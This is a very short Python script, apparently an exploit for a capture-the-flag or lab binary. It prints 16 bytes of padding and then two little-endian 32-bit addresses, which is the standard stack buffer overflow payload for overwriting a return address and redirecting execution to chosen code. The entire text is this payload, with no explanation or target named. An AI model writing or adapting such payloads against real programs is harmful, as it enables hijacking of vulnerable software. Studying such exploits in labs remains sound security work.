import sys

b = "0000000000000000"
b= b.encode("utf-8")
sys.stdout.buffer.write(b + b"\x23\x8c\x04\x08" + b"\x93\x8c\x04\x08")